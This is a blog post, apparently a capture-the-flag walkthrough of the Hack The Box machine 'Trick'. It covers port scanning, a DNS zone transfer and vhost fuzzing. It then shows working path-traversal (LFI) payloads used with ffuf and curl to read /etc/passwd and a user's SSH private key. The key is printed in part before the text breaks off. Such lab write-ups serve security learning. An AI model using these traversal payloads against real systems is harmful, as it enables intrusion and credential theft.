@@ -1,0 +1,715 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+        <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="author" content="MØstXeon">
+<meta name="description" content="false" />
+<meta name="keywords" content=", DNS, Virtual-Host-Enumeration, LFI, Fail2ban, Bruteforce" />
+<meta name="robots" content="noodp" />
+<meta name="theme-color" content="" />
+<link rel="canonical" href="https://mostxeon.github.io/posts/trick/" />
+
+
+    <title>
+        
+            Trick :: MØst Xeon  — A simple blog about Cyber Security
+        
+    </title>
+
+
+
+<link href="https://cdnjs.cloudflare.com/ajax/libs/flag-icon-css/3.5.0/css/flag-icon.min.css" rel="stylesheet"
+    type="text/css">
+
+
+
+<link rel="stylesheet" href="/main.95aad797b4ac37875a27d7418e1f17962c12ae6eba2ef3abc677cd14fad7fc5e.css">
+
+
+
+    <link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png">
+    <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+    <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png">
+    <link rel="manifest" href="/site.webmanifest">
+    <link rel="mask-icon" href="/safari-pinned-tab.svg" color="">
+    <link rel="shortcut icon" href="/favicon.ico">
+    <meta name="msapplication-TileColor" content="">
+
+
+<meta itemprop="name" content="Trick">
+<meta itemprop="description" content="false"><meta itemprop="datePublished" content="2022-10-28T13:44:37+03:00" />
+<meta itemprop="dateModified" content="2022-10-28T13:44:37+03:00" />
+<meta itemprop="wordCount" content="1955">
+<meta itemprop="keywords" content="DNS,Virtual-Host-Enumeration,LFI,Fail2ban,Bruteforce," />
+<meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="Trick"/>
+<meta name="twitter:description" content="false"/>
+
+
+
+
+
+
+
+    <meta property="article:published_time" content="2022-10-28 13:44:37 &#43;0300 EEST" />
+
+
+
+
+
+
+
+
+
+
+    </head>
+
+    
+        <body>
+    
+    
+        <div class="container">
+            <header class="header">
+    <span class="header__inner">
+        <a href="/" style="text-decoration: none;">
+    <div class="logo">
+        
+            <span class="logo__mark">#</span>
+            <span class="logo__text">cd ~</span>
+            <span class="logo__cursor" style=
+                  "
+                   
+                   ">
+            </span>
+        
+    </div>
+</a>
+
+
+        <span class="header__right">
+            
+                <nav class="menu">
+    <ul class="menu__inner"><li>
+                <a href="/posts/">#ls posts</a><span class="logo__cursor" style="margin: 0"></span>
+            </li><li>
+                <a href="/tags/">#ls tags</a><span class="logo__cursor" style="margin: 0"></span>
+            </li><li>
+                <a href="/difficulty">#ls difficulty</a><span class="logo__cursor" style="margin: 0"></span>
+            </li><li>
+                <a href="/about">#whoami</a><span class="logo__cursor" style="margin: 0"></span>
+            </li>
+    </ul>
+</nav>
+
+                <span class="menu-trigger">
+                    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
+                        <path d="M0 0h24v24H0z" fill="none"/>
+                        <path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z"/>
+                    </svg>
+                </span>
+            
+                <span class="theme-toggle not-selectable"><svg class="theme-toggler" width="24" height="24" viewBox="0 0 48 48" fill="none" xmlns="http://www.w3.org/2000/svg">
+   <path d="M22 41C32.4934 41 41 32.4934 41 22C41 11.5066 32.4934 3 22
+   3C11.5066 3 3 11.5066 3 22C3 32.4934 11.5066 41 22 41ZM7 22C7
+   13.7157 13.7157 7 22 7V37C13.7157 37 7 30.2843 7 22Z"/>
+ </svg></span>
+        </span>
+    </span>
+</header>
+
+
+            <div class="content">
+                
+  <main class="post">
+
+    <div class="post-info">
+      <p>
+        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-clock">
+          <circle cx="12" cy="12" r="10"></circle>
+          <polyline points="12 6 12 12 16 14"></polyline>
+        </svg>
+        10 minutes
+
+        
+      </p>
+    </div>
+
+    <article>
+      <h1 class="post-title">
+        <a href="https://mostxeon.github.io/posts/trick/">Trick</a>
+      </h1>
+
+      
+
+      
+        <figure class="post-cover">
+          <img src="https://www.hackthebox.com/storage/avatars/ca56ef43d636aff7da48a8b484756cfe.png" alt="Trick" />
+          
+          
+            <figcaption class="center">Machine created by <a href="https://app.hackthebox.com/users/184611">Geiseric</a></figcaption>
+          
+        </figure>
+      
+        <hr />
+        <aside id="toc">
+          <div class="toc-title">Table of Contents</div>
+          <nav id="TableOfContents">
+  <ul>
+    <li><a href="#initial-recon">Initial Recon</a>
+      <ul>
+        <li><a href="#nmap">Nmap</a></li>
+        <li><a href="#interacting-with-services">Interacting With Services</a></li>
+      </ul>
+    </li>
+    <li><a href="#enumerating-web-server">Enumerating Web Server</a>
+      <ul>
+        <li><a href="#vhost-enumeration">VHOST Enumeration</a></li>
+        <li><a href="#exploiting-lfi">Exploiting LFI</a></li>
+      </ul>
+    </li>
+    <li><a href="#getting-user">Getting User</a></li>
+    <li><a href="#post-enumeration">Post Enumeration</a></li>
+    <li><a href="#getting-root">Getting root</a></li>
+  </ul>
+</nav>
+        </aside>
+        <hr />
+
+      
+
+      <div class="post-content">
+        <h2 id="initial-recon">Initial Recon</h2>
+<h3 id="nmap">Nmap</h3>
+<p>Starting with a basic tcp scan for the top 1000 ports using nmap, I got the below results:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ nmap -p- -A 10.10.11.166
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Starting Nmap 7.93 <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2022-10-28 13:47 EEST
+</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#66d9ef">for</span> trick.htb <span style="color:#f92672">(</span>10.10.11.166<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>Host is up <span style="color:#f92672">(</span>0.15s latency<span style="color:#f92672">)</span>.
+</span></span><span style="display:flex;"><span>Not shown: <span style="color:#ae81ff">65531</span> closed tcp ports <span style="color:#f92672">(</span>conn-refused<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>PORT   STATE SERVICE VERSION
+</span></span><span style="display:flex;"><span>22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 <span style="color:#f92672">(</span>protocol 2.0<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>| ssh-hostkey: 
+</span></span><span style="display:flex;"><span>|   <span style="color:#ae81ff">2048</span> 61ff293b36bd9dacfbde1f56884cae2d <span style="color:#f92672">(</span>RSA<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>|   <span style="color:#ae81ff">256</span> 9ecdf2406196ea21a6ce2602af759a78 <span style="color:#f92672">(</span>ECDSA<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>|_  <span style="color:#ae81ff">256</span> 7293f91158de34ad12b54b4a7364b970 <span style="color:#f92672">(</span>ED25519<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>25/tcp open  smtp    Postfix smtpd
+</span></span><span style="display:flex;"><span>|_smtp-commands: debian.localdomain, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, SMTPUTF8, CHUNKING
+</span></span><span style="display:flex;"><span>53/tcp open  domain  ISC BIND 9.11.5-P4-5.1+deb10u7 <span style="color:#f92672">(</span>Debian Linux<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>| dns-nsid: 
+</span></span><span style="display:flex;"><span>|_  bind.version: 9.11.5-P4-5.1+deb10u7-Debian
+</span></span><span style="display:flex;"><span>80/tcp open  http    nginx 1.14.2
+</span></span><span style="display:flex;"><span>|_http-title: Coming Soon - Start Bootstrap Theme
+</span></span><span style="display:flex;"><span>|_http-server-header: nginx/1.14.2
+</span></span><span style="display:flex;"><span>Service Info: Host:  debian.localdomain; OS: Linux; CPE: cpe:/o:linux:linux_kernel
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+</span></span><span style="display:flex;"><span>Nmap <span style="color:#66d9ef">done</span>: <span style="color:#ae81ff">1</span> IP address <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> host up<span style="color:#f92672">)</span> scanned in 527.64 seconds
+</span></span></code></pre></div><p>Few ports are open including (22,25,53,80) and I can see that port 53 running a dns server is open. Usually dns services operate on udp ports I&rsquo;ll also scan top 1000 udp ports on this machine.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ sudo nmap -A -sU 10.10.11.166
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Starting Nmap 7.93 <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2022-10-28 14:00 EEST
+</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#66d9ef">for</span> trick.htb <span style="color:#f92672">(</span>10.10.11.166<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>Host is up <span style="color:#f92672">(</span>0.099s latency<span style="color:#f92672">)</span>.
+</span></span><span style="display:flex;"><span>Not shown: <span style="color:#ae81ff">996</span> closed udp ports <span style="color:#f92672">(</span>port-unreach<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>PORT     STATE         SERVICE  VERSION
+</span></span><span style="display:flex;"><span>53/udp   open          domain   ISC BIND 9.11.5-P4-5.1+deb10u7 <span style="color:#f92672">(</span>Debian Linux<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>| dns-nsid: 
+</span></span><span style="display:flex;"><span>|_  bind.version: 9.11.5-P4-5.1+deb10u7-Debian
+</span></span><span style="display:flex;"><span>68/udp   open|filtered dhcpc
+</span></span><span style="display:flex;"><span>631/udp  open|filtered ipp
+</span></span><span style="display:flex;"><span>5353/udp open|filtered zeroconf
+</span></span><span style="display:flex;"><span>Device type: remote management|webcam|phone|general purpose|storage-misc
+</span></span><span style="display:flex;"><span>Running: Avocent embedded, AXIS embedded, Google Android 2.X, Linux 2.6.X|3.X, ZyXEL embedded
+</span></span><span style="display:flex;"><span>OS CPE: cpe:/h:axis:207w_network_camera cpe:/o:google:android:2.2 cpe:/o:linux:linux_kernel:2.6 cpe:/o:linux:linux_kernel:2.6.17 cpe:/o:linux:linux_kernel:3.8 cpe:/h:zyxel:nsa-210
+</span></span><span style="display:flex;"><span>Too many fingerprints match this host to give specific OS details
+</span></span><span style="display:flex;"><span>Network Distance: <span style="color:#ae81ff">2</span> hops
+</span></span><span style="display:flex;"><span>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>TRACEROUTE <span style="color:#f92672">(</span>using port 49194/udp<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>HOP RTT       ADDRESS
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">1</span>   139.39 ms 10.10.16.1
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">2</span>   73.82 ms  10.10.11.166
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+</span></span><span style="display:flex;"><span>Nmap <span style="color:#66d9ef">done</span>: <span style="color:#ae81ff">1</span> IP address <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> host up<span style="color:#f92672">)</span> scanned in 1231.47 seconds
+</span></span></code></pre></div><h3 id="interacting-with-services">Interacting With Services</h3>
+<h4 id="port-80-tcp">Port 80 (TCP)</h4>
+<p>Navigating to the web server on port 80, I didn&rsquo;t find anything of interest.</p>
+<p><img src="main_page_port80.png" alt="Main Page Port 80"></p>
+<p>It&rsquo;s a single static page with no useful information.</p>
+<h4 id="port-53-udptcp">Port 53 (UDP/TCP)</h4>
+<p>I&rsquo;ll try first to look for <a href="https://book.hacktricks.xyz/network-services-pentesting/pentesting-dns#zone-transfer"><em>Zone Transfer</em></a> if enabled in order to get more information about the target since I don&rsquo;t even know its domain name.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ dig axfr @10.10.11.166
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>; &lt;&lt;&gt;&gt; DiG 9.18.7-1-Debian &lt;&lt;&gt;&gt; axfr @10.10.11.166
+</span></span><span style="display:flex;"><span>; <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> server found<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>;; global options: +cmd
+</span></span><span style="display:flex;"><span>;; Query time: <span style="color:#ae81ff">84</span> msec
+</span></span><span style="display:flex;"><span>;; SERVER: 10.10.11.166#53<span style="color:#f92672">(</span>10.10.11.166<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>UDP<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>;; WHEN: Fri Oct <span style="color:#ae81ff">28</span> 14:13:16 EEST <span style="color:#ae81ff">2022</span>
+</span></span><span style="display:flex;"><span>;; MSG SIZE  rcvd: <span style="color:#ae81ff">56</span>
+</span></span></code></pre></div><p>Howerver I didn&rsquo;t get anything useful, I&rsquo;ll try now by guessing the domain from the machine&rsquo;s name <em>trick.htb</em>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ dig axfr @10.10.11.166 trick.htb
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>; &lt;&lt;&gt;&gt; DiG 9.18.7-1-Debian &lt;&lt;&gt;&gt; axfr @10.10.11.166 trick.htb
+</span></span><span style="display:flex;"><span>; <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> server found<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>;; global options: +cmd
+</span></span><span style="display:flex;"><span>trick.htb.		604800	IN	SOA	trick.htb. root.trick.htb. <span style="color:#ae81ff">5</span> <span style="color:#ae81ff">604800</span> <span style="color:#ae81ff">86400</span> <span style="color:#ae81ff">2419200</span> <span style="color:#ae81ff">604800</span>
+</span></span><span style="display:flex;"><span>trick.htb.		604800	IN	NS	trick.htb.
+</span></span><span style="display:flex;"><span>trick.htb.		604800	IN	A	127.0.0.1
+</span></span><span style="display:flex;"><span>trick.htb.		604800	IN	AAAA	::1
+</span></span><span style="display:flex;"><span>preprod-payroll.trick.htb. <span style="color:#ae81ff">604800</span> IN	CNAME	trick.htb.
+</span></span><span style="display:flex;"><span>trick.htb.		604800	IN	SOA	trick.htb. root.trick.htb. <span style="color:#ae81ff">5</span> <span style="color:#ae81ff">604800</span> <span style="color:#ae81ff">86400</span> <span style="color:#ae81ff">2419200</span> <span style="color:#ae81ff">604800</span>
+</span></span><span style="display:flex;"><span>;; Query time: <span style="color:#ae81ff">240</span> msec
+</span></span><span style="display:flex;"><span>;; SERVER: 10.10.11.166#53<span style="color:#f92672">(</span>10.10.11.166<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>TCP<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>;; WHEN: Fri Oct <span style="color:#ae81ff">28</span> 14:21:21 EEST <span style="color:#ae81ff">2022</span>
+</span></span><span style="display:flex;"><span>;; XFR size: <span style="color:#ae81ff">6</span> records <span style="color:#f92672">(</span>messages 1, bytes 231<span style="color:#f92672">)</span>
+</span></span></code></pre></div><p>From the results above, I can see that <em>trick.htb</em> is a valid domain name, it also discloses a new domain <em>preprod-payroll.trick.htb</em>, so I&rsquo;ll add these to my <em>/etc/hosts</em> file.</p>
+<h2 id="enumerating-web-server">Enumerating Web Server</h2>
+<h3 id="vhost-enumeration">VHOST Enumeration</h3>
+<p>After some simple directory bruteforcing on <em>preprod-payroll.trick.htb</em>, I came to a dead end. The only thing I found was a login page and a <em>database</em> directory giving me a 403 forbidden, and I wasn&rsquo;t able to find any files there with the simple wordlists I use.</p>
+<p>So I had to enumerate <em>vhosts</em> looking for some hidden domains. Again using a simple wordlist from <a href="https://github.com/danielmiessler/SecLists"><em>seclists</em></a> called <a href="https://github.com/danielmiessler/SecLists/blob/master/Discovery/DNS/subdomains-top1million-5000.txt"><em>subdomains-top1million-5000.txt</em></a> I wasn&rsquo;t able to find anything, however this time I had a clue about the manner they name their domain, it seems that they append the prefix <em>preprod-</em> to thier domain, so why not doing the same and bruteforce vhosts again using this prefix.</p>
+<ul>
+<li>
+<p>Enumerating vhosts using <a href="https://github.com/OJ/gobuster"><em>Gobuster</em></a>:</p>
+<ul>
+<li>I can create a new wordlist from <a href="https://github.com/danielmiessler/SecLists/blob/master/Discovery/DNS/subdomains-top1million-5000.txt"><em>subdomains-top1million-5000.txt</em></a> by appending <em>preprod-</em> to each line using sed: <code>sed 's/^/preprod-/' /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt &gt; new_custom_wordlist.txt</code></li>
+<li>Then use vhost flag with gobuster <code>gobuster vhost -w new_custom_wordlist.txt -u trick.htb --append-domain</code></li>
+</ul>
+</li>
+<li>
+<p>Enumerating vhosts using <a href="https://github.com/ffuf/ffuf"><em>Ffuf</em></a>:</p>
+<ul>
+<li>Here I don&rsquo;t need to create a new wordlist, but I do need to filter requests on the size because the server responds with <em>200 response code</em> on any random subdomain, so the only way to know if the subdomain is valid is by getting a different content length: <code>ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -u http://trick.htb/ -H 'Host: preprod-FUZZ.trick.htb' -fs 5480</code></li>
+<li><em>Note</em>: This is the same technique that <em>gobuster vhost</em> flag uses.</li>
+</ul>
+</li>
+</ul>
+<p>I got a valid domain <em>preprod-marketing.trick.htb</em> so I&rsquo;ll add it to my <em>/etc/hosts</em> file.</p>
+<p>Navigating to this new domain, I can clearly see that it is a new website:</p>
+<p><img src="preprod-marketing.trick.htb-main-page.png" alt="preprod-marketing.trick.htb Main Page"></p>
+<h3 id="exploiting-lfi">Exploiting LFI</h3>
+<p>Navigating to one of the present tabs, I noticed <em>?page=services.html</em> GET parameter, which might indicate a possible <a href="https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/07-Input_Validation_Testing/11.1-Testing_for_Local_File_Inclusion"><em>LFI vulnerability</em></a>.</p>
+<p>Again, I&rsquo;ll use <a href="https://github.com/ffuf/ffuf"><em>Ffuf</em></a> to fuzz this parameter using <em>LFI</em> payloads from <a href="https://github.com/danielmiessler/SecLists"><em>seclists</em></a>.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ ffuf -w /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt -u http://preprod-marketing.trick.htb/index.php?page<span style="color:#f92672">=</span>FUZZ -fs <span style="color:#ae81ff">0</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        /<span style="color:#e6db74">&#39;___\  /&#39;</span>___<span style="color:#ae81ff">\ </span>          /<span style="color:#960050;background-color:#1e0010">&#39;</span>___<span style="color:#ae81ff">\ </span>      
+</span></span><span style="display:flex;"><span>       /<span style="color:#ae81ff">\ \_</span>_/ /<span style="color:#ae81ff">\ \_</span>_/  __  __  /<span style="color:#ae81ff">\ \_</span>_/       
+</span></span><span style="display:flex;"><span>       <span style="color:#ae81ff">\ \ </span>,__<span style="color:#ae81ff">\\</span> <span style="color:#ae81ff">\ </span>,__<span style="color:#ae81ff">\/\ \/\ \ \ \ </span>,__<span style="color:#ae81ff">\ </span>     
+</span></span><span style="display:flex;"><span>        <span style="color:#ae81ff">\ \ \_</span>/ <span style="color:#ae81ff">\ \ \_</span>/<span style="color:#ae81ff">\ \ \_\ \ \ \ \_</span>/      
+</span></span><span style="display:flex;"><span>         <span style="color:#ae81ff">\ \_\ </span>  <span style="color:#ae81ff">\ \_\ </span> <span style="color:#ae81ff">\ \_</span>___/  <span style="color:#ae81ff">\ \_\ </span>      
+</span></span><span style="display:flex;"><span>          <span style="color:#ae81ff">\/</span>_/    <span style="color:#ae81ff">\/</span>_/   <span style="color:#ae81ff">\/</span>___/    <span style="color:#ae81ff">\/</span>_/       
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>       v1.5.0 Kali Exclusive &lt;<span style="color:#ae81ff">3</span>
+</span></span><span style="display:flex;"><span>________________________________________________
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span> :: Method           : GET
+</span></span><span style="display:flex;"><span> :: URL              : http://preprod-marketing.trick.htb/index.php?page<span style="color:#f92672">=</span>FUZZ
+</span></span><span style="display:flex;"><span> :: Wordlist         : FUZZ: /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt
+</span></span><span style="display:flex;"><span> :: Follow redirects : false
+</span></span><span style="display:flex;"><span> :: Calibration      : false
+</span></span><span style="display:flex;"><span> :: Timeout          : <span style="color:#ae81ff">10</span>
+</span></span><span style="display:flex;"><span> :: Threads          : <span style="color:#ae81ff">40</span>
+</span></span><span style="display:flex;"><span> :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500
+</span></span><span style="display:flex;"><span> :: Filter           : Response size: <span style="color:#ae81ff">0</span>
+</span></span><span style="display:flex;"><span>________________________________________________
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//etc/passwd <span style="color:#f92672">[</span>Status: 200, Size: 2351, Words: 28, Lines: 42, Duration: 153ms<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//etc/passwd <span style="color:#f92672">[</span>Status: 200, Size: 2351, Words: 28, Lines: 42, Duration: 225ms<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//etc/passwd <span style="color:#f92672">[</span>Status: 200, Size: 2351, Words: 28, Lines: 42, Duration: 86ms<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//etc/passwd <span style="color:#f92672">[</span>Status: 200, Size: 2351, Words: 28, Lines: 42, Duration: 85ms<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//etc/passwd <span style="color:#f92672">[</span>Status: 200, Size: 2351, Words: 28, Lines: 42, Duration: 85ms<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//etc/passwd <span style="color:#f92672">[</span>Status: 200, Size: 2351, Words: 28, Lines: 42, Duration: 96ms<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//etc/passwd <span style="color:#f92672">[</span>Status: 200, Size: 2351, Words: 28, Lines: 42, Duration: 97ms<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>....//....//....//....//....//....//....//....//....//....//....//....//....//etc/passwd <span style="color:#f92672">[</span>Status: 200, Size: 2351, Words: 28, Lines: 42, Duration: 98ms<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//etc/passwd <span style="color:#f92672">[</span>Status: 200, Size: 2351, Words: 28, Lines: 42, Duration: 98ms<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>....//....//....//....//....//....//....//....//....//....//etc/passwd <span style="color:#f92672">[</span>Status: 200, Size: 2351, Words: 28, Lines: 42, Duration: 88ms<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>....//....//....//....//....//....//....//....//....//....//....//....//....//....//etc/passwd <span style="color:#f92672">[</span>Status: 200, Size: 2351, Words: 28, Lines: 42, Duration: 99ms<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>....//....//....//....//....//....//....//....//....//....//....//etc/passwd <span style="color:#f92672">[</span>Status: 200, Size: 2351, Words: 28, Lines: 42, Duration: 90ms<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>....//....//....//....//....//....//etc/passwd <span style="color:#f92672">[</span>Status: 200, Size: 2351, Words: 28, Lines: 42, Duration: 90ms<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>....//....//....//....//....//etc/passwd <span style="color:#f92672">[</span>Status: 200, Size: 2351, Words: 28, Lines: 42, Duration: 91ms<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>....//....//....//....//....//....//....//....//....//....//....//....//etc/passwd <span style="color:#f92672">[</span>Status: 200, Size: 2351, Words: 28, Lines: 42, Duration: 93ms<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>....//....//....//....//....//....//....//....//....//etc/passwd <span style="color:#f92672">[</span>Status: 200, Size: 2351, Words: 28, Lines: 42, Duration: 94ms<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>....//....//....//etc/passwd <span style="color:#f92672">[</span>Status: 200, Size: 2351, Words: 28, Lines: 42, Duration: 100ms<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>....//....//....//....//....//....//....//....//etc/passwd <span style="color:#f92672">[</span>Status: 200, Size: 2351, Words: 28, Lines: 42, Duration: 105ms<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>....//....//....//....//etc/passwd <span style="color:#f92672">[</span>Status: 200, Size: 2351, Words: 28, Lines: 42, Duration: 119ms<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>....//....//....//....//....//....//....//etc/passwd <span style="color:#f92672">[</span>Status: 200, Size: 2351, Words: 28, Lines: 42, Duration: 122ms<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>:: Progress: <span style="color:#f92672">[</span>920/920<span style="color:#f92672">]</span> :: Job <span style="color:#f92672">[</span>1/1<span style="color:#f92672">]</span> :: <span style="color:#ae81ff">416</span> req/sec :: Duration: <span style="color:#f92672">[</span>0:00:02<span style="color:#f92672">]</span> :: Errors: <span style="color:#ae81ff">0</span> ::
+</span></span></code></pre></div><p>And I got several hits with a payload like <code>....//....//....//....//....//....//....//etc/passwd</code>, so now I&rsquo;ll use curl to read local files from this server.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ curl http://preprod-marketing.trick.htb/index.php?page<span style="color:#f92672">=</span>....//....//....//....//....//....//....//etc/passwd
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>root:x:0:0:root:/root:/bin/bash
+</span></span><span style="display:flex;"><span>...
+</span></span><span style="display:flex;"><span>michael:x:1001:1001::/home/michael:/bin/bash
+</span></span></code></pre></div><h2 id="getting-user">Getting User</h2>
+<p>From <em>/etc/passwd</em> I can see that <em>michael</em> is a user on this machine, so I&rsquo;ll try to read his <em>private SSH key</em> which will usually be present in <em>/home/[username]/.ssh/id_rsa</em>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ curl http://preprod-marketing.trick.htb/index.php?page<span style="color:#f92672">=</span>....//....//....//....//....//....//....//home/michael/.ssh/id_rsa
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>-----BEGIN OPENSSH PRIVATE KEY-----
+</span></span><span style="display:flex;"><span>b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABFwAAAAdzc2gtcn
+</span></span><span style="display:flex;"><span>NhAAAAAwEAAQAAAQEAwI9YLFRKT6JFTSqPt2/+7mgg5HpSwzHZwu95Nqh1Gu4+9P+ohLtz
+</span></span><span style="display:flex;"><span>c4jtky6wYGzlxKHg/Q5ehozs9TgNWPVKh+j92WdCNPvdzaQqYKxw4Fwd3K7F4JsnZaJk2G
+</span></span><span style="display:flex;"><span>YQ2re/gTrNElMAqURSCVydx/UvGCNT9dwQ4zna4sxIZF4HpwRt1T74wioqIX3EAYCCZcf+
+</span></span><span style="display:flex;"><span>4gAYBhUQTYeJlYpDVfbbRH2yD73x7NcICp5iIYrdS455nARJtPHYkO9eobmyamyNDgAia/
+</span></span><span style="display:flex;"><span>Ukn75SroKGUMdiJHnd+m1jW5mGotQRxkATWMY5qFOiKglnws/jgdxpDV9K3iDTPWXFwtK4
+</span></span><span style="display:flex;"><span>1kC+t4a8sQAAA8hzFJk2cxSZNgAAAAdzc2gtcnNhAAABAQDAj1gsVEpPokVNKo+3b/7uaC
+</span></span><span style="display:flex;"><span>DkelLDMdnC73k2qHUa7j70/6iEu3NziO2TLrBgbOXEoeD9Dl6GjOz1OA1Y9UqH6P3ZZ0I0
+</span></span><span style="display:flex;"><span>+93NpCpgrHDgXB3crsXgmydlomTYZhDat7+BOs0SUwCpRFIJXJ3H9S8YI1P13BDjOdrizE
